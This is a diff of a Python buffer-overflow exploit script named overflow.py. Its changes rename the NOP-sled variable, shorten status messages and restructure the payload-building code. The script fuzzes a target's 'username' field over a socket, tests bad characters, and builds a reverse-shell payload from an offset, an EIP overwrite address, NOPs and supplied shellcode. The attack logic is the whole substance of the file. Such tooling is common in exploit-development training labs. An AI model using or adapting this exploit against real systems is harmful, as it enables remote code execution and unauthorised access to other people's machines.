@@ -3,8 +3,6 @@ of the functions needed to perform the buffer overflow.
 
 Name: overflow.py
 
-
-
 ███████╗███████╗██████╗ ██╗   ██╗███████╗███████╗
 ██╔════╝╚══███╔╝██╔══██╗██║   ██║██╔════╝██╔════╝
 █████╗    ███╔╝ ██████╔╝██║   ██║█████╗  █████╗  
@@ -25,7 +23,7 @@ try:
 except ImportError as err:
 	print(f"Import Error: {err}")
 
-# |_______________( Ansicolors )_______________|
+# |_______________( Ansicolors )_______________
 
 rst = "\033[0m"
 bld = "\033[01m"
@@ -75,10 +73,10 @@ class Overflow:
 	""" Overflow class definition
 
 	Attributes:
-		nop_sled (str): A raw string of 16 no operation bytes
+		nops (str): A raw string of 16 no operation bytes
 		chars (str): All possible characters to test application for bad characters.
 	"""
-	nop_sled = b"\x90"*10
+	nops = b"\x90"*10
 	chars = (
 "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
 "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -403,7 +401,7 @@ class Overflow:
 		self.num_bytes_crash = 100
 
 		if not chars and not shellcode:
-			print(pe+bld+"[+]"+rst+" _____( Intiating fuzzing procedure )_____")
+			print(pe+bld+"[+]"+rst+" Intiating fuzzing procedure")
 			while self.num_bytes_crash <= self.max_fuzz_bytes:
 				content = (
 					"username=" 
@@ -419,7 +417,7 @@ class Overflow:
 				soc.settimeout(3)
 
 				try:
-					print(be+bld+"[+]"+rst+f" _____( Sending payload containing {gn+str(self.num_bytes_crash)+rst} bytes )_____")
+					print(be+bld+"[+]"+rst+f" Sending payload containing {gn+str(self.num_bytes_crash)+rst} bytes")
 					soc.send(bytes(buff, "utf-8"))
 					soc.recv(1024)
 					self.num_bytes_crash += self.fuzz_increment
@@ -433,6 +431,7 @@ class Overflow:
 				if not self.offset:
 					raise NoOffsetError("An offset value must be set before sending the bad characters payload")
 				else:
+					chars = bytes(chars, "utf-8")
 					content = (
 						b"username=" 
 						+ b"A"*self.offset 
@@ -453,7 +452,7 @@ class Overflow:
 
 			soc = self._create_socket()
 
-			print(yw+bld+"[+]"+rst+" _____( Sent payload to test bad characters )_____")
+			print(yw+bld+"[+]"+rst+" Sent bad characters string")
 			try:
 				soc.send(buff)
 			except BaseException as err:
@@ -465,18 +464,18 @@ class Overflow:
 			try:
 				if not self.offset:
 					raise NoOffsetError("An offset must be set before sending a reverse shell payload")
-				if not self.jump_eip:
+				elif not self.jump_eip:
 					raise NoEipMemoryAddressError("A memory address must be set to overwrite eip")
-				content  = (
-					b"username="
-					+ b"A"*self.offset
-					+ self.jump_eip
-					+ b"C"*4
-					+ self.nop_sled
-					+ shellcode.encode()
-					+ b"D"*(self.num_bytes_crash-self.offset-4-4-16-len(shellcode))
-					+ b"&password=A"
-				)
+				else:
+					content  = (
+						b"username="
+						+ b"A"*self.offset
+						+ self.jump_eip
+						+ b"C"*4
+						+ self.nops
+						+ shellcode
+						+ b"&password=A"
+					)
 			except NoOffsetError as err:
 				print(rd+bld+"[-] "+rst+f"NoOffsetError: {err}")
 				exit(1)
@@ -491,7 +490,7 @@ class Overflow:
 
 			soc = self._create_socket()
 
-			print(gn+bld+"[+]"+rst+" _____( Sent reverse shell payload )_____")
+			print(gn+bld+"[+]"+rst+" Reverse shell payload sent")
 			try:
 				soc.send(buff)
 			except socket.error as err:
@@ -523,7 +522,7 @@ class Overflow:
 				buff += content
 
 				bytes_payload = bytes(buff, "utf-8")
-				print(gn+bld+"[+]"+rst+" _____( Sending pattern payload )_____")
+				print(gn+bld+"[+]"+rst+" Sent pattern payload")
 				soc.send(bytes_payload)
 		except socket.error as err:
 			print(rd+bld+"[-]"+bld+f" SocketError: {err}")
